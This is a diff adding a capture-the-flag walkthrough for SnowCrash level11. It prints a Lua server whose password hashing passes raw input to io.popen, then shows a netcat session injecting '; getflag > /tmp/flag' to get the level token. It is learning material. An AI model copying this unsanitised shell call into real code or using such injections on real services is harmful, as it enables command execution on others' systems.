@@ -1055,3 +1055,117 @@ level11@SnowCrash:~$
 ```
 
 </details>
+
+## level11
+
+<details>
+
+<summary>Explanations</summary>
+
+###
+
+Once more, we have a file: ``level09.lua``. When executing it, this happens:
+```bash
+level11@SnowCrash:~$ lua level11.lua 
+lua: level11.lua:3: address already in use
+stack traceback:
+	[C]: in function 'assert'
+	level11.lua:3: in main chunk
+	[C]: ?
+```
+
+This file is not executable. So let's see the code:
+```bash
+level11@SnowCrash:~$ cat level11.lua 
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+```
+
+So as we can see, the lua script is trying to open a server, but when executing it ourselves, it says the address is already in use.
+
+So maybe the server is already up, and they gave us the code just to inspect what could be the entrypoint to get the flag:
+```bash
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: 
+```
+
+It requests us a password, like the lua script should do. So the server is indeed already up, and this is indeed the server's code.
+
+But we have no way of getting the password. And even if we could, when we look closer at the code, if we manage to find the password, nothing will happen except sending a message:
+```lua
+if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+  client:send("Erf nope..\n");
+else
+  client:send("Gz you dumb*\n")
+end
+```
+
+The real thing here is actually how the password is hashed:
+```lua
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+```
+
+We can see this:
+```lua
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+
+### Retrieving the token
+
+``io.popen()`` is the equivalent of ``os.execute()``. And as we can guess, it can run commands. The only difference between these 2 functions, is what the output looks like (way easier to read with ``io.popen()``). The exploit is similar to some of others exploits we already did with ``echo`` when letting users put their own string. So let's use this to run ``getflag`` and store it somewhere:
+```bash
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: ; getflag > /tmp/flag
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
+
+And it worked! We got the token, so let's go onto the next level:
+```bash
+level11@SnowCrash:~$ su level12
+Password: 
+level12@SnowCrash:~$ 
+```
+
+</details>
